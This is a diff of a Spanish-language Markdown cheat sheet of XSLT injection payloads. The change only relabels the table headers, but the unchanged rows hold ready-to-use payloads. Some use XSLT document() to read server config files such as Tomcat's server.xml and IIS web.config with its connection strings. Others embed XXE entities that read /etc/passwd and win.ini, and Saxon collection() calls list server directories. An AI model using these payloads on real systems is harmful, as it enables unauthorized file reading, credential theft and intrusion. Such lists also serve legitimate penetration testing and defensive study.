@@ -25,7 +25,7 @@ linked:
 
 ## Función document()
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Lectura XML local Linux | `<xsl:copy-of select="document('file:///etc/tomcat9/server.xml')"/>` | Solo si el archivo es XML válido. |
 | Lectura XML local Windows | `<xsl:copy-of select="document('file:///C:/inetpub/wwwroot/web.config')"/>` | IIS connection strings. |
@@ -56,7 +56,7 @@ ___
 
 ## XXE dentro de XSLT
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | XXE clásico file | `<!DOCTYPE doc [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><xsl:template match="/"><out>&xxe;</out></xsl:template>` | Si el parser XML del XSLT no bloquea entidades externas. |
 | XXE Windows | `<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">` | Probe legible Windows. |
@@ -86,7 +86,7 @@ ___
 
 ## Lectura de Directorios
 
-| **Objetivo** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Listar dir Saxon 9+ | `<xsl:for-each select="collection('file:///etc/?select=*;recurse=no')"><xsl:value-of select="document-uri(.)"/></xsl:for-each>` | Iterador con filtro glob. |
 | Listar recursivo | `<xsl:for-each select="collection('file:///var/www/?select=*;recurse=yes')"><xsl:value-of select="document-uri(.)"/></xsl:for-each>` | Recurse=yes. |
